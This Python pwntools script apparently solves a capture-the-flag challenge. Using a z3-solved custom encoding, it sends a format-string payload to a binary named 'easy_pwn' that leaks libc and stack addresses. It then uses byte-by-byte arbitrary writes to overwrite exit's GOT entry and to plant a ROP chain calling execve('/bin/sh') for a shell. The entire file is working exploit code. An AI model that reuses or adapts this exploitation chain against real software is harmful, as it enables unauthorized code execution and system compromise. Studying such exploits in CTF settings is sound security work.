from z3 import *
from pwn import *
from LibcSearcher import *

destring='7M9BXCGPswHRFxvbdaNgyVilEmpD/foYhTznK6Lkj5A+t3W20reUZO18QcSqJI4u'
context.arch='amd64'
def decode(aa,bb,cc):
    a=Int('a')
    b=Int('b')
    c=Int('c')
    d=Int('d')
    s=Solver()
    s.add(a>=0 , a < 64)
    s.add(b>=0 , b < 64)
    s.add(c>=0 , c < 64)
    s.add(d>=0 , d < 64)
    s.add(aa==(4*a+(b-b%16)/16)%256)
    s.add((16*b+ (c-c%4)/4)%256==bb)
    s.add(cc==(d+64*c)%256)
    print(s.check())
    print(s.model())
    m=s.model()
    return m.eval(a),m.eval(b),m.eval(c),m.eval(d)
def realpayload(payload):
    payload=payload.ljust(len(payload)+len(payload)%3,b'a').decode()
    print(payload)
    ans=b''
    for i in range(len(payload)//3):
        print(ord(payload[3*i]),ord(payload[3*i+1]),ord(payload[3*i+2]))
        m=decode(ord(payload[3*i]),ord(payload[3*i+1]),ord(payload[3*i+2]))
        # print(m[0].as_long(),m[1].as_long(),m[2].as_long(),m[3].as_long())
        ans+=destring[m[0].as_long()].encode()+destring[m[1].as_long()].encode()+destring[m[2].as_long()].encode()+destring[m[3].as_long()].encode()
    # print(ans)
    return ans
    
def findloc(c):
    return destring.find(c)


context.log_level = 'debug' 
p=process('./easy_pwn')
# p=remote('t.ctf.qwq.cc',49175)
elf=ELF('./easy_pwn')
libc=ELF('./libc-2.27.so')
p.recvuntil(b'tell me your name\n')
setbuf_got=elf.got['setbuf']
exit_got=0x602060
printfaddr=0x064E80
execve=0x00000000000E4E30
bss=elf.bss()+0x20
# 0x4f322
# 0x10a38c
# read_got 12
# first=0x40
# second=0xC84-first
# payload=b'%'+str(first).encode()+b'c%13$hhn%'+str(second).encode()+b'c%12$hn'
payload=b'bb%31$pcc%34$pdd'
realpay=realpayload(payload)
pause()
# p.sendline(b'sss')
p.sendline(realpay.ljust(0x20,b'\x00'))
p.recvuntil(b'your name is \n')
p.recvuntil(b'bb')
puts_addr=int(p.recv(14),16)-418
p.recvuntil(b'cc')
stack_addr=int(p.recv(14),16)+8#得到的是rbp的地址
print(hex(puts_addr))
print(hex(stack_addr))
libcbase=puts_addr-libc.sym['puts']
print(hex(libcbase))
# p.sendline(realpay)
p.recvuntil(b'this is a gift for you\n')

bss=elf.bss()
print('bss',hex(bss))

#把exit_got地址改成任意写三字节之前的地方
p.send(p64(exit_got))
p.send(p8(0x84))
p.send(p64(exit_got+1))
p.send(p8(0xc))
p.send(p64(exit_got+2))
p.send(p8(0x40))
execve_addr=libcbase+execve
system_addr=libcbase+libc.sym['system']
pop_rdi=0x0000000000400d53
pop_rax=0x00000000000439c8+libcbase
pop_rsi=0x0000000000023e6a+libcbase
pop_rdx=0x0000000000001b96+libcbase
printf_addr=libcbase+libc.sym['printf']
payload=p64(pop_rdi)+p64(bss)+p64(pop_rax)+p64(0x3b)+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(execve_addr)

for i in range(len(payload)):
    p.send(p64(stack_addr+i))
    p.send(p8(payload[i]))
pause()

catflag=b'/bin/sh\x00'
# catflag=b'cat flag\x00'
for i in range(len(catflag)):
    p.send(p64(bss+i))
    p.send(p8(catflag[i]))
#每次利用利用任意地址写时三次为一组，进行补齐
for i in range(3-(len(payload)+len(catflag))%3):
    p.send(p64(bss+0))
    p.send(p8(catflag[0]))
p.send(p64(exit_got))
p.send(p8(0xee))
p.send(p64(exit_got+1))
p.send(p8(0x9))
pause()
p.send(p64(exit_got+2))
gdb.attach(p)
p.send(p8(0x40))

pause()
# p.interactive()
# p.send(realpay.ljust(0x20,b'\x00')+p64(exit_got)+p64(exit_got+2))
p.interactive()